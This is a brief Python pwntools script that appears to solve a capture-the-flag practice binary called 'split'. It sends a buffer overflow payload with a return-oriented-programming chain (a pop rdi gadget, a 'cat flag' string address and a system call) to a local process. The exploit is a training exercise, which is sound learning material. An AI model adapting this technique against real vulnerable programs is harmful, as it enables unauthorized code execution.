from pwn import *
context.log_level='DEBUG'
r = process("./split")
cat_flag = p64(0x00601060)
system = p64(0x000000000040074b)
pop_rdi = p64(0x00000000004007c3)
payload = b'\x90'*40 + pop_rdi + cat_flag + system
r.sendline(payload)
r.recvall()
